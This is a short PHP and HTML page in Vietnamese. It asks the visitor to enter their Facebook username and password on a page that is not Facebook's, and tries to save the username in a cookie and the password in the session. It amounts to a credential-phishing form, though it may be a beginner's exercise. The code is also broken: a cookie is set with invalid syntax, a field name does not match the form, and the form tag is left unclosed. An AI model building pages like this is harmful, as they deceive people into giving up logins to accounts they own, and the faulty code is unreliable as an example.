<?php 
session_start();
    if (!empty($_POST['submit'])) {
        $_COOKIE('taikhoan',$_POST['username']);
        $_SESSION['matkhau'] = $_POST['password'];
    }
?>
<!DOCTYPE html> 
<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<link rel="stylesheet" href="style.css"/> 
</head> 
<body> 
<form action='in.php' class="dangnhap" method='POST' style="text-align: center"> 
Nhập Tài Khoản FaceBook của Bạn! <br> <br>
Tên đăng nhập : <input type='text' name='username' /> <br> <br>
Mật khẩu : <input type='password' name='password' /> <br><br>
<input type='submit' class="button" name="dangnhap" value='Đăng nhập' />  
<form> 
</body> 
</html>